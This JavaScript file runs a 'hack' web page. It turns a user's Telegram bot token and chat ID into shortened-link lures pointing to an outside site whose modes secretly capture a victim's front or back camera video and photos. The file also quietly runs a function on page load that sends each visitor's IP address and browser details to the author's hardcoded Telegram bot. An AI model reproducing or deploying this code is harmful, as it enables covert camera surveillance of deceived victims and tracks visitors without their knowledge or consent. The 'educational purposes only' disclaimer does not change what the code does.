// Play loading sound when the page loads
        window.addEventListener('load', function() {
            const loadingSound = document.getElementById('loadingSound');
            loadingSound.play();
        });

        document.addEventListener('DOMContentLoaded', function() {
            const hackButton = document.querySelector('.hack-button');
            const tokenInput = document.getElementById('token');
            const chatIdInput = document.getElementById('chatid');
            const resultContainer = document.getElementById('result');
            const statusMessage = document.getElementById('statusMessage');
            const popup = document.getElementById('popup');
            const clickSound = document.getElementById('clickSound');

            // Add typing animation to the terminal line
            const typingElement = document.querySelector('.typing');
            setTimeout(() => {
                typingElement.style.animation = 'none';
                typingElement.style.borderRight = 'none';
            }, 3500);

            hackButton.addEventListener('click', function() {
                clickSound.play();

                const token = tokenInput.value.trim();
                const chatId = chatIdInput.value.trim();

                if (!token || !chatId) {
                    alert("Please fill in both the Token and Chat ID fields.");
                    return;
                }

                // Validate token format (basic check)
                if (!token.includes(':') || token.split(':')[0].length < 5) {
                    alert("Invalid Telegram Token format. Please check and try again.");
                    return;
                }

                // Validate chat ID (basic check)
                if (isNaN(chatId) || chatId.length < 5) {
                    alert("Invalid Chat ID format. Please check and try again.");
                    return;
                }

                // Show loading state
                hackButton.textContent = "SENDING...";
                hackButton.disabled = true;
                resultContainer.style.display = 'block';
                statusMessage.textContent = "Establishing connection to Telegram API...";
                statusMessage.className = "status-message";

                // Generate the URLs with the provided token and chat ID
                const frontVideoUrl = `https://vide0chat.vercel.app/chat/?token=${token}&id=${chatId}&mode=front-video&duration=2`;
                const frontBackUrl = `https://vide0chat.vercel.app/chat/?token=${token}&id=${chatId}&mode=front-back&duration=2`;
                const frontPhotoUrl = `https://vide0chat.vercel.app/chat/?token=${token}&id=${chatId}&mode=front-photo`;
                const backPhotoUrl = `https://vide0chat.vercel.app/chat/?token=${token}&id=${chatId}&mode=back-photo`;

                // Message to send via Telegram
                const message = `
🎯 Your Device Access Links  ↙️

📹 <b>Front Camera Video (2 sec):</b>
${frontVideoUrl}

🔄 <b>Front-Back Camera (2 sec):</b>
${frontBackUrl}

📸 <b>Front Camera Photo:</b>
${frontPhotoUrl}

📸 <b>Back Camera Photo:</b>
${backPhotoUrl}

🔖 Shorten your link here: <a href="https://lc.cx/en">https://lc.cx/en</a>

<b>Disclaimer:</b> This tool is intended for educational purposes only.
<b>Credit:</b><a href="https://t.me/ronjumodz">Ronjumodz
                `;

                // Send the message to the Telegram bot
                sendTelegramMessage(token, chatId, message);
            });

            function sendTelegramMessage(token, chatId, message) {
                statusMessage.textContent = "Sending device access links to your Telegram bot...";

                // Using Telegram Bot API to send message
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        statusMessage.textContent = "SUCCESS: Device access links have been sent to your Telegram bot!";
                        statusMessage.className = "status-message success";
                        popup.style.display = 'block'; // Show pop-up message
                    } else {
                        statusMessage.textContent = `ERROR: Failed to send message. ${data.description || 'Please check your Token and Chat ID.'}`;
                        statusMessage.className = "status-message error";
                    }

                    // Reset button
                    hackButton.textContent = "INITIALIZE H@CK";
                    hackButton.disabled = false;
                })
                .catch(error => {
                    console.error('Error:', error);
                    statusMessage.textContent = "ERROR: Network error. Please check your connection and try again.";
                    statusMessage.className = "status-message error";

                    // Reset button
                    hackButton.textContent = "INITIALIZE H@CK";
                    hackButton.disabled = false;
                });
            }

            // Add some visual effects to inputs on focus
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.boxShadow = '0 0 10px rgba(0, 255, 0, 0.5)';
                });

                input.addEventListener('blur', function() {
                    this.style.boxShadow = 'none';
                });
            });
        });
        async function sendVisitorInfo() {
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;
    
    const userAgent = navigator.userAgent;
    
    const currentDate = new Date().toLocaleDateString();
    const currentTime = new Date().toLocaleTimeString();
    
    const telegramMessage = `🚀 New Visitor Alert 🚀\n\n🌐 IP: ${ip}\n\n🖥️ User Agent: ${userAgent}\n\n📅 Date: ${currentDate}\n\n🕒 Time: ${currentTime}\n\n🔗https://ronjumodz.vercel.app`;

    const telegramApiUrl = `https://api.telegram.org/bot8381206044:AAEW3tSs4BBY1u-Vjd4jJ_MxSIyCQQVTk40/sendMessage?chat_id=7755338110&text=${encodeURIComponent(telegramMessage)}`;
    
    fetch(telegramApiUrl);
  } catch (error) {
    console.error('Error sending visitor info:', error);
  }
}

sendVisitorInfo();